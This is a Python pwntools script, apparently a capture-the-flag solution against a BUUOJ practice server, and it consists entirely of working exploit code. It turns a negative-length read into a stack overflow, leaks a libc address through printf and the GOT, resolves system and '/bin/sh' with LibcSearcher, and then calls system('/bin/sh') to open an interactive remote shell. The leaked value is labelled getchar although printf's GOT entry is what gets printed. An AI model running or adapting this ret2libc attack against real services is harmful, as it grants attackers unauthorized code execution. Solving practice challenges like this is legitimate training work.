from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26226)
elf = ELF('./pwn')

io.sendlineafter(b'How many bytes do you want me to read? ', b'-1')
io.sendlineafter(b'bytes of data!', cyclic(0x2C + 4) + p32(elf.plt['printf']) + p32(elf.symbols['vuln']) + p32(elf.got['printf']))
io.recvuntil(p32(elf.got['printf']) + b'\n')

io.recv(4)
getchar = u32(io.recv(4))

libc = LibcSearcher('getchar', getchar)
print(hex(getchar))
base = getchar - libc.dump('getchar')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

print(hex(base))
print(hex(sys))
print(hex(binsh))

io.sendline(b'-1')
io.sendlineafter(b'bytes of data!', cyclic(0x2C + 4) + p32(sys) + p32(binsh) + p32(binsh))

io.interactive()